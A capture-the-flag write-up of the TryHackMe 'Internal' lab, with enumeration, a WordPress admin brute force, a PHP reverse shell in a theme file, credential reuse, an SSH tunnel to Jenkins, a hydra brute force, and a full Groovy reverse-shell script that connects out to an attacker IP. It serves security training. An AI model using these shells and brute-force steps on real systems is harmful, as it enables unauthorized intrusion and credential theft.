---
layout: default
title: Internal
description: THM - Internal
---

## Enumeration

Nmap Scan:
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 21:21 EEST
Nmap scan report for 10.10.61.56
Host is up (0.070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.14 seconds
```

Gobuster:
```
/blog
/wordpress
/javascript
```
WPscan:
```
wpscan --url http://10.10.61.56/blog/ --enumerate u

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```
This would be a good time to add “internal.thm” to your “/etc/hosts”.

Now, while I look around on the pages for any clues (CTFs am i right?), I'll start wpscan to bruteforce the wordpress login.

While I was looking around, wpscan found something.
```
[!] Valid Combinations Found:
 | Username: admin, Password: [REDACTED]
```
And we logged in!

Now we'll navigate to “Appearance/Theme Editor” and replace the “404.php” file contents with a php shell. I'll use the one from PentestMonkey.

The theme is Twenty Seventeen, so our shell will be located at 
```
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```
Now we got our shell:
```
# nc -lvnp 9002            
Listening on 0.0.0.0 9002
Connection received on 10.10.61.56 39104
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 15:37:53 up 18 min,  0 users,  load average: 0.00, 0.05, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ 

```

I recommend checking out “Full TTYs” from hacktricks -> [Right Here](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)

We cd into “/home”, and have a look around.
```
www-data@internal:/$ cd /home
cd /home
www-data@internal:/home$ ls
ls
aubreanna
www-data@internal:/home$ cd aubreanna
cd aubreanna
bash: cd: aubreanna: Permission denied
www-data@internal:/home$
```
As you can see, we don't have permission to look inside “aubreanna”

We'll also check “/opt” as it's good practice.
```
www-data@internal:/opt$ ls
ls
containerd  wp-save.txt
www-data@internal:/opt$ cat wp-save.txt
cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:[REDACTED]
www-data@internal:/opt$
```
Cool, now we have aubreanna's login info. The text file indicates wordpress access, but we already have that. So let's try to ssh into the machine using those credentials.

```
aubreanna@internal:~$ whoami
aubreanna
```
We'll read “user.txt”, submit it, and then move on.
```
aubreanna@internal:/home$ cd aubreanna/
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ cat user.txt
[REDACTED]
aubreanna@internal:~$ 

```
We've also found a "jenkins.txt" file, let's see what's inside.
```
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
```

Ok, we have an internal service running. Now we need to access it.

A quick look on superuser.com, talks about forwarding / ssh tunneling. As we need to access an internal service from the outside.

And so, we create an ssh tunnel:
```
ssh -N -L 5555:172.17.0.2:8080 aubreanna@10.10.61.56
```
And if we navigate to localhost:5555, we got access to a jenkins webpage.

Default credentials, or at least those that I know of, are not working, so I'll capture the login request in burp, and then use hydra to try and bruteforce it.
```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 5555 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```
```
[5555][http-post-form] host: 127.0.0.1   login: [REDACTED]   password: [REDACTED]
```
Cool! Now we'll login, and abuse the jenkins script console to get a reverse shell again.

We'll run this script in the “http://localhost:5555/script”:
```
String host="10.18.116.220";
int port=5554;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
```
nc -lvnp 5554
Listening on 0.0.0.0 5554
Connection received on 10.10.61.56 56022
python -c 'import pty; pty.spawn("/bin/bash")'
jenkins@jenkins:/$ 
```
And we have another shell!

Snooping around a bit, we find this:
```
jenkins@jenkins:/$ cd /home
cd /home
jenkins@jenkins:/home$ ls
ls
jenkins@jenkins:/home$ cd /opt
cd /opt
jenkins@jenkins:/opt$ ls
ls
note.txt
jenkins@jenkins:/opt$ cat note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:[REDACTED]
jenkins@jenkins:/opt$ 
```
Looks like we have the root password. Let's try to ssh using these credentials.

```
Last login: Mon Aug  3 19:59:17 2020 from 10.6.2.56
root@internal:~# id
uid=0(root) gid=0(root) groups=0(root)
root@internal:~#
```

All there's left to do, is to read the “/root/root.txt” file, and you're done!

Good hunting o7

[Try it out yourself!](https://tryhackme.com/room/internal)

[back](./)
